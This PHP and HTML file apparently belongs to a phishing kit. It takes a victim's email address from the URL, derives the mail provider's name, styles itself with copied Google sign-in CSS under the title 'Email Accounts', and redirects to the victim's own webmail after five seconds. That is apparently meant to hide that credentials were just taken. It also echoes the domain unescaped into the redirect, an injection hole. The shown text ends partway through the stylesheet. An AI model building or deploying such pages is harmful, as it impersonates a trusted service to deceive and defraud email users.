<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta HTTP-EQUIV="REFRESH" content="5; url=http://webmail.<?php echo $domain ?>">
<meta name="viewport" content="" id="viewport" />
  <title>Email Accounts</title>
<style type="text/css">
  html, body, div, h1, h2, h3, h4, h5, h6, p, img, dl,
  dt, dd, ol, ul, li, table, tr, td, form, object, embed,
  article, aside, canvas, command, details, fieldset,
  figcaption, figure, footer, group, header, hgroup, legend,
  mark, menu, meter, nav, output, progress, section, summary,
  time, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
  }
  article, aside, details, figcaption, figure, footer,
  header, hgroup, menu, nav, section {
  display: block;
  }
  html {
  font: 81.25% arial, helvetica, sans-serif;
  background: #fff;
  color: #333;
  line-height: 1;
  direction: ltr;
  }
  a {
  color: #15c;
  text-decoration: none;
  }
  a:active {
  color: #d14836;
  }
  a:hover {
  text-decoration: underline;
  }
  h1, h2, h3, h4, h5, h6 {
  color: #222;
  font-size: 1.54em;
  font-weight: normal;
  line-height: 24px;
  margin: 0 0 .46em;
  }
  p {
  line-height: 17px;
  margin: 0 0 1em;
  }
  ol, ul {
  list-style: none;
  line-height: 17px;
  margin: 0 0 1em;
  }
  li {
  margin: 0 0 .5em;
  }
  table {
  border-collapse: collapse;
  border-spacing: 0;
  }
  strong {
  color: #222;
  }
</style>
<style type="text/css">
  html, body {
  position: absolute;
  height: 100%;
  min-width: 100%;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .wrapper + style + iframe {
  display: none;
  }
  .content {
  padding: 0 44px;
  }
  .topbar {
  text-align: right;
  padding-top: .5em;
  padding-bottom: .5em;
  }
  .google-header-bar {
  height: 71px;
  background: #f1f1f1;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  }
  .header .signin,
  .header .signup {
  margin: 28px 0 0;
  float: right;
  font-weight: bold;
  }
  .header .signin-button,
  .header .signup-button {
  margin: 22px 0 0;
  float: right;
  }
  .header .signin-button a {
  font-size: 13px;
  font-weight: normal;
  }
  .header .signup-button a {
  position: relative;
  top: -1px;
  margin: 0 0 0 1em;
  }
  .main {
  margin: 0 auto;
  width: 650px;
  padding-top: 23px;
  padding-bottom: 100px;
  }
  .main h1:first-child {
  margin: 0 0 .92em;
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #ebebeb;
  overflow: hidden;
  }
  .footer {
  padding-top: 9px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  color: #999;
  float: left;
  max-width: 80%;
  }
  .footer ul li {
  display: inline;
  padding: 0 1.5em 0 0;
  }
  .footer a {
  color: #333;
  }
  .footer .lang-chooser-wrap {
  float: right;
  max-width: 20%;
  }
  .footer .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .footer .attribution {
  float: right;
  }
  .footer .attribution span {
  vertical-align: text-top;
  }
  .redtext {
  color: #dd4b39;
  }
  .greytext {
  color: #555;
  }
  .secondary {
  font-size: 11px;
  color: #666;
  }
  .source {
  color: #093;
  }
  .hidden {
  display: none;
  }
  .clearfix:after {
  visibility: hidden;
  display: block;
  font-size: 0;
  content: '.';
  clear: both;
  height: 0;
  }
  * html .clearfix {
  zoom: 1;
  }
  *:first-child+html .clearfix {
  zoom: 1;
  }
  pre {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  }
</style>
<style type="text/css">
  button, input, select, textarea {
  font-family: inherit;
  font-size: inherit;
  }
  button::-moz-focus-inner,
  input::-moz-focus-inner {
  border: 0;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 29px;
  margin: 0;
  padding: 0 8px;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=email][disabled=disabled],
  input[type=number][disabled=disabled],
  input[type=password][disabled=disabled],
  input[type=tel][disabled=disabled],
  input[type=text][disabled=disabled],
  input[type=url][disabled=disabled] {
  border: 1px solid #e5e5e5;
  background: #f1f1f1;
  }
  input[type=email][disabled=disabled]:hover,
  input[type=number][disabled=disabled]:hover,
  input[type=password][disabled=disabled]:hover,
  input[type=tel][disabled=disabled]:hover,
  input[type=text][disabled=disabled]:hover,
  input[type=url][disabled=disabled]:hover {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=email][readonly=readonly],
  input[type=number][readonly=readonly],
  input[type=password][readonly=readonly],
  input[type=text][readonly=readonly],
  input[type=url][readonly=readonly] {
  border: 1px solid #d9d9d9;
  }
  input[type=email][readonly=readonly]:hover,
  input[type=number][readonly=readonly]:hover,
  input[type=password][readonly=readonly]:hover,
  input[type=text][readonly=readonly]:hover,
  input[type=url][readonly=readonly]:hover,
  input[type=email][readonly=readonly]:focus,
  input[type=number][readonly=readonly]:focus,
  input[type=password][readonly=readonly]:focus,
  input[type=text][readonly=readonly]:focus,
  input[type=url][readonly=readonly]:focus {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  appearance: none;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #dcdcdc;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  border-color: #c6c6c6;
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color:#4d90fe;
  }
  .gaia-country-menu-item-flag, .gaia-country-menu-item-noflag {
  width: 16px;
  height: 11px;
  margin-right: 1em;
  }
  .gaia-country-menu-item-flag {
  background: no-repeat url(//ssl.gstatic.com/i18n/phonenumbers/phoneinputwidget/flags4.png) 0 0;
  overflow: hidden;
  }
  .g-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  height: 27px;
  padding: 0 8px;
  line-height: 27px;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  -webkit-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -ms-transition: all 0.218s;
  -o-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  cursor: default;
  }
  *+html .g-button {
  min-width: 70px;
  }
  button.g-button,
  input[type=submit].g-button {
  height: 29px;
  line-height: 29px;
  vertical-align: bottom;
  margin: 0;
  }
  input[type=submit].g-button:disabled {
  -webkit-appearance: none;
  }
  *+html button.g-button,
  *+html input[type=submit].g-button {
  overflow: visible;
  }
  .g-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -webkit-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -ms-transition: all 0.0s;
  -o-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f6f6f6),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button:visited {
  color: #666;
  }
  .g-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#4787ed));
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .g-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .g-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -webkit-box-shadow: inset 0 1px 2px rgb	a(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-share {
  border: 1px solid #29691d;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #3d9400;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#398a00));
  background-image: -webkit-linear-gradient(top,#3d9400,#398a00);
  background-image: -moz-linear-gradient(top,#3d9400,#398a00);
  background-image: -ms-linear-gradient(top,#3d9400,#398a00);
  background-image: -o-linear-gradient(top,#3d9400,#398a00);
  background-image: linear-gradient(top,#3d9400,#398a00);
  }
  .g-button-share:hover {
  border: 1px solid #2d6200;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #368200;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#368200));
  background-image: -webkit-linear-gradient(top,#3d9400,#368200);
  background-image: -moz-linear-gradient(top,#3d9400,#368200);
  background-image: -ms-linear-gradient(top,#3d9400,#368200);
  background-image: -o-linear-gradient(top,#3d9400,#368200);
  background-image: linear-gradient(top,#3d9400,#368200);
  }
  .g-button-share:active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  text-transform: uppercase;
  background-color: #d14836;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#d14836));
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .g-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#c53727));
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -ms-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -o-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  }
  .g-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#b0281a));
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  color: #fff
  }
  .g-button-white {
  border: 1px solid #dcdcdc;
  color: #666;
  background: #fff;
  }
  .g-button-white:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  background: #fff;
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button-white:active {
  background: #fff;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button-red:visited,
  .g-button-share:visited,
  .g-button-submit:visited {
  color: #fff;
  }
  .g-button-submit:focus,
  .g-button-share:focus,
  .g-button-red:focus {
  -webkit-box-shadow: inset 0 0 0 1px #fff;
  -moz-box-shadow: inset 0 0 0 1px #fff;
  box-shadow: inset 0 0 0 1px #fff;
  }
  .g-button-share:focus {
  border-color: #29691d;
  }
  .g-button-red:focus {
  border-color: #d14836;
  }
  .g-button-submit:focus:hover,
  .g-button-share:focus:hover,
  .g-button-red:focus:hover {
  -webkit-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button.selected {
  background-color: #eee;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#eee),to(#e0e0e0));
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  border: 1px solid #ccc;
  color: #333;
  }
  .g-button img {
  display: inline-block;
  margin: -3px 0 0;
  opacity: .55;
  filter: alpha(opacity=55);
  vertical-align: middle;
  pointer-events: none;
  }
  *+html .g-button img {
  margin: 4px 0 0;
  }
  .g-button:hover img {
  opacity: .72;
  filter: alpha(opacity=72);
  }
  .g-button:active img {
  opacity: 1;
  filter: alpha(opacity=100);
  }
  .g-button.disabled img {
  opacity: .5;
  filter: alpha(opacity=50);
  }
  .g-button.disabled,
  .g-button.disabled:hover,
  .g-button.disabled:active,
  .g-button-submit.disabled,
  .g-button-submit.disabled:hover,
  .g-button-submit.disabled:active,
  .g-button-share.disabled,
  .g-button-share.disabled:hover,
  .g-button-share.disabled:active,
  .g-button-red.disabled,
  .g-button-red.disabled:hover,
  .g-button-red.disabled:active,
  input[type=submit][disabled].g-button {
  background-color: none;
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .goog-menu {
  -webkit-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -webkit-transition: opacity 0.218s;
  -moz-transition: opacity 0.218s;
  -ms-transition: opacity 0.218s;
  -o-transition: opacity 0.218s;
  transition: opacity 0.218s;
  background: #fff;
  border: 1px solid #ccc;
  border: 1px solid rgba(0,0,0,.2);
  cursor: default;
  font-size: 13px;
  margin: 0;
  outline: none;
  padding: 0 0 6px;
  position: absolute;
  z-index: 1000;
  overflow: auto;
  }
  .goog-menuitem,
  .goog-tristatemenuitem,
  .goog-filterobsmenuitem {
  position: relative;
  color: #333;
  cursor: pointer;
  list-style: none;
  margin: 0;
  padding: 6px 7em 6px 30px;
  white-space: nowrap;
  }
  .goog-menuitem-highlight,
  .goog-menuitem-hover {
  background-color: #eee;
  border-color: #eee;
  border-style: dotted;
  border-width: 1px 0;
  padding-top: 5px;
  padding-bottom: 5px;
  }
  .goog-menuitem-highlight .goog-menuitem-content,
  .goog-menuitem-hover .goog-menuitem-content {
  color: #333;
  }
  .goog-menuseparator {
  border-top: 1px solid #ebebeb;
  margin-top: 9px;
  margin-bottom: 10px;
  }
  .goog-inline-block {
  position: relative;
  display: -moz-inline-box;
  display: inline-block;
  }
  * html .goog-inline-block {
  display: inline;
  }
  *:first-child+html .goog-inline-block {
  display: inline;
  }
  .dropdown-block {
  display: block;
  }
  .goog-flat-menu-button {
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 2px;
  min-width: 46px;
  outline: none;
  padding: 0 18px 0 6px;
  text-decoration: none;
  vertical-align: middle;
  }
  .goog-flat-menu-button-disabled {
  background-color: #fff;
  border-color: #f3f3f3;
  color: #b8b8b8;
  cursor: default;
  }
  .goog-flat-menu-button.goog-flat-menu-button-hover {
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  box-shadow: 0 1px 1px rgba(0,0,0,.1);
  border-color: #c6c6c6;
  color: #333;
  }
  .goog-flat-menu-button.goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .form-error .goog-flat-menu-button {
  border: 1px solid #dd4b39;
  }
  .form-error .goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .goog-flat-menu-button.goog-flat-menu-button-open,
  .goog-flat-menu-button.goog-flat-menu-button-active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  background-color: #eee;
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  border: 1px solid #ccc;
  color: #333;
  z-index: 2;
  }
  .goog-flat-menu-button-caption {
  cursor: default;
  vertical-align: top;
  white-space: nowrap;
  }
  .goog-flat-menu-button-dropdown {
  border-color: #777 transparent;
  border-style: solid;
  border-width: 4px 4px 0;
  height: 0;
  width: 0;
  position: absolute;
  right: 5px;
  top: 12px;
  }
  .jfk-select .goog-flat-menu-button-dropdown {
  background: url(//ssl.gstatic.com/ui/v1/disclosure/grey-disclosure-arrow-up-down.png) center no-repeat;
  border: none;
  height: 11px;
  margin-top: -4px;
  width: 7px;
  }
  .goog-menu-nocheckbox .goog-menuitem,
  .goog-menu-noicon .goog-menuitem {
  padding-left: 16px;
  vertical-align: middle;
  }
  body ::-webkit-scrollbar {
  height: 16px;
  width: 16px;
  overflow: visible;
  }
  body ::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  body ::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  body ::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  body ::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  body ::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  body ::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track {
